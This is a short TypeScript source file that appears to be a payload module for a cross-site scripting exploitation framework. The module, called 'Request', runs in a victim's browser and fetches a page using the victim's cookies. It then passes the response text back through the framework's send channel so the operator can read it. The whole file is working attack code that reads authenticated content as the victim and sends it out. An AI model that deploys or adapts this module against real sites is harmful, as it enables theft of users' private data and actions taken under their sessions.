import { XSSModule } from '../types/index.js';

export const requestModule: XSSModule = {
  name: 'Request',
  description: 'A simple module showing that you can perform any request!',
  
  execute: async (send) => {
    // Change the URL if you wish.
    const URL = '/';
    const method = 'GET';

    const response = await fetch(URL, { credentials: 'include' });
    send(await response.text());
  },
  
  handleResult: (log, data) => {
    const blob = new Blob([data], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    log(`The request has been sent! <a target="_blank" href="${url}">Click here</a> to read the response.`, 'html');
  }
};

export default requestModule;